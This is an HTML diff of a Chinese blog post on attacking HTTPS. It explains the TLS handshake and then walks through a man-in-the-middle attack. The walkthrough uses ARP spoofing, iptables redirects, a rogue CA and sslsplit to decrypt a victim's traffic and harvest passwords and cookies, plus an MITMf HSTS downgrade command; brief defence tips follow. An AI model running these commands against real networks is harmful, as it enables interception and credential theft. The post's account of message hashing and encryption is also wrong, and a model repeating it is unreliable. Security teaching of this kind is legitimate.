@@ -1,0 +1,601 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="TimeS0ng" />
+
+
+
+<meta name="description" content="0x00. HTTPS简介&amp;emsp;&amp;emsp;超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL/TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTTPS攻击">
+<meta property="og:url" content="http://TimeS0ng.github.io/2017/10/27/HTTPS攻击/index.html">
+<meta property="og:site_name" content="TimeS0ng&#39;s blog">
+<meta property="og:description" content="0x00. HTTPS简介&amp;emsp;&amp;emsp;超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL/TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://note.youdao.com/yws/public/resource/b1540f77c63d69bb2568836970494df4/xmlnote/WEBRESOURCE3d6869925e8ee4875d1f1e227fd804bb/4307">
+<meta property="og:image" content="http://note.youdao.com/yws/public/resource/b1540f77c63d69bb2568836970494df4/xmlnote/6EB70B114869460E88237A53C65D8E10/4435">
+<meta property="og:image" content="http://note.youdao.com/yws/public/resource/b1540f77c63d69bb2568836970494df4/xmlnote/7AD511B11C824B98B4B9555AEDE1443C/4449">
+<meta property="og:image" content="http://note.youdao.com/yws/public/resource/b1540f77c63d69bb2568836970494df4/xmlnote/73A648CB3A9442459A5DCA6CEAFD64E3/4471">
+<meta property="og:updated_time" content="2017-10-27T02:11:16.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HTTPS攻击">
+<meta name="twitter:description" content="0x00. HTTPS简介&amp;emsp;&amp;emsp;超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL/TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。">
+<meta name="twitter:image" content="http://note.youdao.com/yws/public/resource/b1540f77c63d69bb2568836970494df4/xmlnote/WEBRESOURCE3d6869925e8ee4875d1f1e227fd804bb/4307">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="TimeS0ng&#39;s blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>HTTPS攻击 | TimeS0ng&#39;s blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: true
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">TimeS0ng</a></h1>
+        </hgroup>
+
+        
+
+        
+            <form id="search-form">
+            <input type="text" id="local-search-input" name="q" placeholder="search..." class="search form-control" autocomplete="off" autocorrect="off" searchonload="false" />
+            <i class="fa fa-times" onclick="resetSearch()"></i>
+            </form>
+            <div id="local-search-result"></div>
+            <p class='no-result'>No results found <i class='fa fa-spinner fa-pulse'></i></p>
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:TimeS0ng@163.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="https://github.com/TimeS0ng" title="GitHub"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://03i0.com">sn00py&#39;s blog</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://edvison.cn">Edvison&#39;s blog</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://ph0rse.me/">ph0rse&#39;s blog</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注技术，乐于分享</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">TimeS0ng</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">TimeS0ng</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:TimeS0ng@163.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/TimeS0ng" title="GitHub"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-HTTPS攻击" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/10/27/HTTPS攻击/" class="article-date">
+      <time datetime="2017-10-27T02:07:44.000Z" itemprop="datePublished">2017-10-27</time>
+</a>
+
+ 
+    <a href="/2017/10/27/HTTPS攻击/#comments" title="查看评论">
+        <i class="fa fa-comments-o" aria-hidden="true"></i>
+        <span class="count-comment"></span>
+        
+        
+            <span class="disqus-comment-count" data-disqus-identifier="2017/10/27/HTTPS攻击/"></span>
+        
+    </a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      HTTPS攻击
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="0x00-HTTPS简介"><a href="#0x00-HTTPS简介" class="headerlink" title="0x00. HTTPS简介"></a>0x00. HTTPS简介</h2><h4 id="emsp-emsp-超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL-TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。"><a href="#emsp-emsp-超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL-TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。" class="headerlink" title="&emsp;&emsp;超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL/TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。"></a>&emsp;&emsp;超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL/TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。</h4><a id="more"></a>
+<hr>
+<h2 id="0x01-HTTPS原理"><a href="#0x01-HTTPS原理" class="headerlink" title="0x01. HTTPS原理"></a>0x01. HTTPS原理</h2><p><img src="http://note.youdao.com/yws/public/resource/b1540f77c63d69bb2568836970494df4/xmlnote/WEBRESOURCE3d6869925e8ee4875d1f1e227fd804bb/4307" alt="image"></p>
+<h4 id="1-首先是建立TCP的三次握手连接，连接建立之后由客户端向浏览器发起https连接请求"><a href="#1-首先是建立TCP的三次握手连接，连接建立之后由客户端向浏览器发起https连接请求" class="headerlink" title="1. 首先是建立TCP的三次握手连接，连接建立之后由客户端向浏览器发起https连接请求"></a>1. 首先是建立TCP的三次握手连接，连接建立之后由客户端向浏览器发起https连接请求</h4><h4 id="2-连接请求成功之后，client会发送自己所有支持的ciphersuit（包括：对称加密算法、非对称加密算法、单向加密算法、伪随机数算法）给目标server进行加密算法的协商，server会选择他们俩都支持的最安全的ciphersuit进行加密通信"><a href="#2-连接请求成功之后，client会发送自己所有支持的ciphersuit（包括：对称加密算法、非对称加密算法、单向加密算法、伪随机数算法）给目标server进行加密算法的协商，server会选择他们俩都支持的最安全的ciphersuit进行加密通信" class="headerlink" title="2. 连接请求成功之后，client会发送自己所有支持的ciphersuit（包括：对称加密算法、非对称加密算法、单向加密算法、伪随机数算法）给目标server进行加密算法的协商，server会选择他们俩都支持的最安全的ciphersuit进行加密通信"></a>2. 连接请求成功之后，client会发送自己所有支持的ciphersuit（包括：对称加密算法、非对称加密算法、单向加密算法、伪随机数算法）给目标server进行加密算法的协商，server会选择他们俩都支持的最安全的ciphersuit进行加密通信</h4><h4 id="3-然后server会发送自己的证书到client（证书用于验证server的身份，同时也包含了server的各种注册信息）"><a href="#3-然后server会发送自己的证书到client（证书用于验证server的身份，同时也包含了server的各种注册信息）" class="headerlink" title="3. 然后server会发送自己的证书到client（证书用于验证server的身份，同时也包含了server的各种注册信息）"></a>3. 然后server会发送自己的证书到client（证书用于验证server的身份，同时也包含了server的各种注册信息）</h4><h4 id="4-client在接收到server的证书之后，会验证该证书是否是由本地根证书中所信任的颁发机构颁发的证书"><a href="#4-client在接收到server的证书之后，会验证该证书是否是由本地根证书中所信任的颁发机构颁发的证书" class="headerlink" title="4. client在接收到server的证书之后，会验证该证书是否是由本地根证书中所信任的颁发机构颁发的证书"></a>4. client在接收到server的证书之后，会验证该证书是否是由本地根证书中所信任的颁发机构颁发的证书</h4><h4 id="【-】证书里面会有证书颁发机构的私钥签名，只有正确的私钥才能被client保存的公钥解密，这就保证了证书的安全性；证书中还会存在server的公钥，只有拥有私钥的server才能解密公钥加密的内容，这就保证了后续过程的安全性。"><a href="#【-】证书里面会有证书颁发机构的私钥签名，只有正确的私钥才能被client保存的公钥解密，这就保证了证书的安全性；证书中还会存在server的公钥，只有拥有私钥的server才能解密公钥加密的内容，这就保证了后续过程的安全性。" class="headerlink" title="【*】证书里面会有证书颁发机构的私钥签名，只有正确的私钥才能被client保存的公钥解密，这就保证了证书的安全性；证书中还会存在server的公钥，只有拥有私钥的server才能解密公钥加密的内容，这就保证了后续过程的安全性。"></a>【*】证书里面会有证书颁发机构的私钥签名，只有正确的私钥才能被client保存的公钥解密，这就保证了证书的安全性；证书中还会存在server的公钥，只有拥有私钥的server才能解密公钥加密的内容，这就保证了后续过程的安全性。</h4><h4 id="5-验证了证书的合法性之后，client会使用刚才协商的伪随机数算法生成对称密钥，然后将对称密钥通过server的公钥进行加密之后，再发送给server"><a href="#5-验证了证书的合法性之后，client会使用刚才协商的伪随机数算法生成对称密钥，然后将对称密钥通过server的公钥进行加密之后，再发送给server" class="headerlink" title="5. 验证了证书的合法性之后，client会使用刚才协商的伪随机数算法生成对称密钥，然后将对称密钥通过server的公钥进行加密之后，再发送给server"></a>5. 验证了证书的合法性之后，client会使用刚才协商的伪随机数算法生成对称密钥，然后将对称密钥通过server的公钥进行加密之后，再发送给server</h4><h4 id="6-server接收到公钥加密的内容之后，会用自己的私钥进行解密，从而获取对称密钥，此时通信双方都得到了对称密钥就可以进行加密通信了"><a href="#6-server接收到公钥加密的内容之后，会用自己的私钥进行解密，从而获取对称密钥，此时通信双方都得到了对称密钥就可以进行加密通信了" class="headerlink" title="6. server接收到公钥加密的内容之后，会用自己的私钥进行解密，从而获取对称密钥，此时通信双方都得到了对称密钥就可以进行加密通信了"></a>6. server接收到公钥加密的内容之后，会用自己的私钥进行解密，从而获取对称密钥，此时通信双方都得到了对称密钥就可以进行加密通信了</h4><h4 id="7-通信时client会先将数据用对称密钥加密，然后又进行hash计算，然后用server的公钥将得到的hash值进行加密，将该hash值和加密之后的密文发送给server端"><a href="#7-通信时client会先将数据用对称密钥加密，然后又进行hash计算，然后用server的公钥将得到的hash值进行加密，将该hash值和加密之后的密文发送给server端" class="headerlink" title="7. 通信时client会先将数据用对称密钥加密，然后又进行hash计算，然后用server的公钥将得到的hash值进行加密，将该hash值和加密之后的密文发送给server端"></a>7. 通信时client会先将数据用对称密钥加密，然后又进行hash计算，然后用server的公钥将得到的hash值进行加密，将该hash值和加密之后的密文发送给server端</h4><h4 id="【-】hash-private-encrypt-data-public-encrypt-hash-emsp-–-gt-emsp-server"><a href="#【-】hash-private-encrypt-data-public-encrypt-hash-emsp-–-gt-emsp-server" class="headerlink" title="【*】hash(private_encrypt(data)) + public_encrypt(hash)&emsp;–&gt;&emsp;server"></a>【*】hash(private_encrypt(data)) + public_encrypt(hash)&emsp;–&gt;&emsp;server</h4><h4 id="8-server接收到client传来的数据包之后，会先用自己的私钥解密密文得到hash1，然后用hash1与没有加密的hash进行比较，相同则代表传输的数据没有被篡改，然后再用之前协商的单向加密算法解密hash，用对称密钥解密密文得到data"><a href="#8-server接收到client传来的数据包之后，会先用自己的私钥解密密文得到hash1，然后用hash1与没有加密的hash进行比较，相同则代表传输的数据没有被篡改，然后再用之前协商的单向加密算法解密hash，用对称密钥解密密文得到data" class="headerlink" title="8. server接收到client传来的数据包之后，会先用自己的私钥解密密文得到hash1，然后用hash1与没有加密的hash进行比较，相同则代表传输的数据没有被篡改，然后再用之前协商的单向加密算法解密hash，用对称密钥解密密文得到data"></a>8. server接收到client传来的数据包之后，会先用自己的私钥解密密文得到hash1，然后用hash1与没有加密的hash进行比较，相同则代表传输的数据没有被篡改，然后再用之前协商的单向加密算法解密hash，用对称密钥解密密文得到data</h4><h3 id="server发送数据过程类似："><a href="#server发送数据过程类似：" class="headerlink" title="server发送数据过程类似："></a>server发送数据过程类似：</h3><h4 id="【-】hash-private-encrypt-data-private-encrypt-hash-emsp-–-gt-emsp-client"><a href="#【-】hash-private-encrypt-data-private-encrypt-hash-emsp-–-gt-emsp-client" class="headerlink" title="【*】hash(private_encrypt(data)) + private_encrypt(hash)&emsp;–&gt;&emsp;client"></a>【*】hash(private_encrypt(data)) + private_encrypt(hash)&emsp;–&gt;&emsp;client</h4><hr>
+<h2 id="0x02-攻击实战"><a href="#0x02-攻击实战" class="headerlink" title="0x02. 攻击实战"></a>0x02. 攻击实战</h2><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><h4 id="emsp-emsp-1-sslsplit、arpspoof"><a href="#emsp-emsp-1-sslsplit、arpspoof" class="headerlink" title="&emsp;&emsp;1. sslsplit、arpspoof"></a>&emsp;&emsp;1. sslsplit、arpspoof</h4><h4 id="emsp-emsp-2-win-7"><a href="#emsp-emsp-2-win-7" class="headerlink" title="&emsp;&emsp;2. win 7"></a>&emsp;&emsp;2. win 7</h4><h3 id="实战步骤"><a href="#实战步骤" class="headerlink" title="实战步骤"></a>实战步骤</h3><h3 id="1-打开kali的数据包转发功能"><a href="#1-打开kali的数据包转发功能" class="headerlink" title="1. 打开kali的数据包转发功能"></a>1. 打开kali的数据包转发功能</h3><blockquote>
+<p>echo 1 &gt;&gt; /proc/sys/net/ipv4/ip_forward</p>
+<h3 id="2-设置端口转发（将原本发过来的80、443等端口全部转发到sslsplit的代理端口）"><a href="#2-设置端口转发（将原本发过来的80、443等端口全部转发到sslsplit的代理端口）" class="headerlink" title="2. 设置端口转发（将原本发过来的80、443等端口全部转发到sslsplit的代理端口）"></a>2. 设置端口转发（将原本发过来的80、443等端口全部转发到sslsplit的代理端口）</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">iptables -t nat -F</div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">80</span> -j REDIRECT --to-ports <span class="number">8080</span></div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">443</span> -j REDIRECT --to-ports <span class="number">8443</span></div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">587</span> -j REDIRECT --to-ports <span class="number">8443</span> </div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">465</span> -j REDIRECT --to-ports <span class="number">8443</span> </div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">993</span> -j REDIRECT --to-ports <span class="number">8443</span> </div><div class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">995</span> -j REDIRECT --to-ports <span class="number">8443</span> </div><div class="line">iptables -t nat -L</div></pre></td></tr></table></figure>
+</blockquote>
+<h3 id="3-利用openssl生成私钥"><a href="#3-利用openssl生成私钥" class="headerlink" title="3. 利用openssl生成私钥"></a>3. 利用openssl生成私钥</h3><blockquote>
+<p>openssl genrsa -out ca.key 2048</p>
+</blockquote>
+<h3 id="4-利用私钥签名生成的证书"><a href="#4-利用私钥签名生成的证书" class="headerlink" title="4. 利用私钥签名生成的证书"></a>4. 利用私钥签名生成的证书</h3><blockquote>
+<p>openssl req -new -x509 -days 1096 -key ca.key -out ca.crt<br><img src="http://note.youdao.com/yws/public/resource/b1540f77c63d69bb2568836970494df4/xmlnote/6EB70B114869460E88237A53C65D8E10/4435" alt="image"></p>
+</blockquote>
+<h3 id="5-启动arpspoof进行中间人攻击"><a href="#5-启动arpspoof进行中间人攻击" class="headerlink" title="5. 启动arpspoof进行中间人攻击"></a>5. 启动arpspoof进行中间人攻击</h3><blockquote>
+<p>arpspoof -i eth0 -t 192.168.1.103 -r 192.168.1.1</p>
+</blockquote>
+<h3 id="6-创建log目录，启动sslsplit"><a href="#6-创建log目录，启动sslsplit" class="headerlink" title="6. 创建log目录，启动sslsplit"></a>6. 创建log目录，启动sslsplit</h3><blockquote>
+<p>mkdir -p test/logdir </p>
+<p>sslsplit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080</p>
+</blockquote>
+<p><img src="http://note.youdao.com/yws/public/resource/b1540f77c63d69bb2568836970494df4/xmlnote/7AD511B11C824B98B4B9555AEDE1443C/4449" alt="image"></p>
+<h4 id="如果像github这种https配置较好的网站是会提醒用户证书错误的，最近刚出的WPA2漏洞里面欺骗的那个https网站就属于配置有误"><a href="#如果像github这种https配置较好的网站是会提醒用户证书错误的，最近刚出的WPA2漏洞里面欺骗的那个https网站就属于配置有误" class="headerlink" title="[*]如果像github这种https配置较好的网站是会提醒用户证书错误的，最近刚出的WPA2漏洞里面欺骗的那个https网站就属于配置有误"></a>[*]如果像github这种https配置较好的网站是会提醒用户证书错误的，最近刚出的WPA2漏洞里面欺骗的那个https网站就属于配置有误</h4><h3 id="7-剩下的就是用正则匹配出想要的账号密码或者cookie了"><a href="#7-剩下的就是用正则匹配出想要的账号密码或者cookie了" class="headerlink" title="7. 剩下的就是用正则匹配出想要的账号密码或者cookie了"></a>7. 剩下的就是用正则匹配出想要的账号密码或者cookie了</h3><h3 id="8-当然我们也能用MITMF对HTTPS做降级攻击，这样就能直接捕获明文"><a href="#8-当然我们也能用MITMF对HTTPS做降级攻击，这样就能直接捕获明文" class="headerlink" title="8. 当然我们也能用MITMF对HTTPS做降级攻击，这样就能直接捕获明文"></a>8. 当然我们也能用MITMF对HTTPS做降级攻击，这样就能直接捕获明文</h3><blockquote>
+<p>iptables -t nat -F</p>
+<p>mitmf <strong>-</strong>-spoof <strong>-</strong>-arp -i eth0 <strong>-</strong>-gateway 192.168.1.1 <strong>-</strong>-target 192.168.1.103 <strong>-</strong>-hsts</p>
+</blockquote>
+<p><img src="http://note.youdao.com/yws/public/resource/b1540f77c63d69bb2568836970494df4/xmlnote/73A648CB3A9442459A5DCA6CEAFD64E3/4471" alt="image"></p>
+<h4 id="方法多种多样，大家还可以尝试其他工具，这里就不一一列举了"><a href="#方法多种多样，大家还可以尝试其他工具，这里就不一一列举了" class="headerlink" title="[*]方法多种多样，大家还可以尝试其他工具，这里就不一一列举了"></a>[*]方法多种多样，大家还可以尝试其他工具，这里就不一一列举了</h4><hr>
+<h2 id="0x03-防御建议"><a href="#0x03-防御建议" class="headerlink" title="0x03. 防御建议"></a>0x03. 防御建议</h2><h3 id="服务端防御"><a href="#服务端防御" class="headerlink" title="服务端防御"></a>服务端防御</h3><h4 id="emsp-emsp-配置最安全的https"><a href="#emsp-emsp-配置最安全的https" class="headerlink" title="&emsp;&emsp;配置最安全的https"></a>&emsp;&emsp;配置最安全的https</h4><h4 id="emsp-emsp-密码不仅要靠https加密传输，在前端也要使用加密控件对密码进行加密，这样就算被降级攻击也拿不到密码明文"><a href="#emsp-emsp-密码不仅要靠https加密传输，在前端也要使用加密控件对密码进行加密，这样就算被降级攻击也拿不到密码明文" class="headerlink" title="&emsp;&emsp;密码不仅要靠https加密传输，在前端也要使用加密控件对密码进行加密，这样就算被降级攻击也拿不到密码明文"></a>&emsp;&emsp;密码不仅要靠https加密传输，在前端也要使用加密控件对密码进行加密，这样就算被降级攻击也拿不到密码明文</h4><h3 id="客户端防御"><a href="#客户端防御" class="headerlink" title="客户端防御"></a>客户端防御</h3><h4 id="emsp-emsp-配置路由规则，绑定IP／MAC以防被ARP欺骗"><a href="#emsp-emsp-配置路由规则，绑定IP／MAC以防被ARP欺骗" class="headerlink" title="&emsp;&emsp;配置路由规则，绑定IP／MAC以防被ARP欺骗"></a>&emsp;&emsp;配置路由规则，绑定IP／MAC以防被ARP欺骗</h4><h4 id="emsp-emsp-谨慎打开浏览器提醒证书错误的网站，但是笔者曾遇到过某部门网站居然都会出现证书报错，不得已还是要打开"><a href="#emsp-emsp-谨慎打开浏览器提醒证书错误的网站，但是笔者曾遇到过某部门网站居然都会出现证书报错，不得已还是要打开" class="headerlink" title="&emsp;&emsp;谨慎打开浏览器提醒证书错误的网站，但是笔者曾遇到过某部门网站居然都会出现证书报错，不得已还是要打开"></a>&emsp;&emsp;谨慎打开浏览器提醒证书错误的网站，但是笔者曾遇到过某部门网站居然都会出现证书报错，不得已还是要打开</h4><h4 id="emsp-emsp-少去蹭网，往往免费的东西才是最贵的"><a href="#emsp-emsp-少去蹭网，往往免费的东西才是最贵的" class="headerlink" title="&emsp;&emsp;少去蹭网，往往免费的东西才是最贵的"></a>&emsp;&emsp;少去蹭网，往往免费的东西才是最贵的</h4><h4 id="emsp-emsp-珍爱生命，远离黑客"><a href="#emsp-emsp-珍爱生命，远离黑客" class="headerlink" title="&emsp;&emsp;珍爱生命，远离黑客"></a>&emsp;&emsp;珍爱生命，远离黑客</h4><hr>
+<h3 id="0x04-结语"><a href="#0x04-结语" class="headerlink" title="0x04. 结语"></a>0x04. 结语</h3><h4 id="emsp-emsp-本篇文章主要是讲解https的原理，适当的讲了一点实战演示，还是那句话：原理最重要，工具是死的，人是活的。"><a href="#emsp-emsp-本篇文章主要是讲解https的原理，适当的讲了一点实战演示，还是那句话：原理最重要，工具是死的，人是活的。" class="headerlink" title="&emsp;&emsp;本篇文章主要是讲解https的原理，适当的讲了一点实战演示，还是那句话：原理最重要，工具是死的，人是活的。"></a>&emsp;&emsp;本篇文章主要是讲解https的原理，适当的讲了一点实战演示，还是那句话：原理最重要，工具是死的，人是活的。</h4>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2017/10/27/HTTPS攻击/">HTTPS攻击</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">TimeS0ng</a></p>
+        <p><span>发布时间:</span>2017-10-27, 10:07:44</p>
+        <p><span>最后更新:</span>2017-10-27, 10:11:16</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2017/10/27/HTTPS攻击/" title="HTTPS攻击">http://TimeS0ng.github.io/2017/10/27/HTTPS攻击/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://TimeS0ng.github.io/2017/10/27/HTTPS攻击/　　作者: TimeS0ng" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2017/10/13/The-Backdoor-Factory/">
+                    The-Backdoor-Factory
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-HTTPS简介"><span class="toc-number">1.</span> <span class="toc-text">0x00. HTTPS简介</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#emsp-emsp-超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL-TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。"><span class="toc-number">1.0.1.</span> <span class="toc-text">  超文本传输安全协议（HTTPS）是一种通过计算机网络进行安全通信的传输协议。HTTPS经由HTTP进行通信，但利用SSL/TLS来加密数据包。HTTPS开发的主要目的，是提供对网站服务器的身份认证，保护交换数据的隐私与完整性。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-HTTPS原理"><span class="toc-number">2.</span> <span class="toc-text">0x01. HTTPS原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-首先是建立TCP的三次握手连接，连接建立之后由客户端向浏览器发起https连接请求"><span class="toc-number">2.0.1.</span> <span class="toc-text">1. 首先是建立TCP的三次握手连接，连接建立之后由客户端向浏览器发起https连接请求</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-连接请求成功之后，client会发送自己所有支持的ciphersuit（包括：对称加密算法、非对称加密算法、单向加密算法、伪随机数算法）给目标server进行加密算法的协商，server会选择他们俩都支持的最安全的ciphersuit进行加密通信"><span class="toc-number">2.0.2.</span> <span class="toc-text">2. 